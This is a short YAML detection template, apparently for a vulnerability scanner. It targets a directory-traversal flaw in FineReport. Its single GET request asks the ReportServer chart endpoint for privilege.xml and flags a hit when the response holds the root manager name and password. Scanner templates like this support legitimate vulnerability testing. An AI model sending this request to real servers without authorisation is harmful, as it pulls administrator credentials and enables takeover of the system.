detail:
  author: l1nk3r(http://www.lmxspace.com/)
  links:
  - http://foreversong.cn/archives/1378
expression: r0()
manual: true
name: poc-yaml-finereport-directory-traversal
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"<rootManagerName>")
      && response.body.bcontains(b"<rootManagerPassword>")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
transport: http
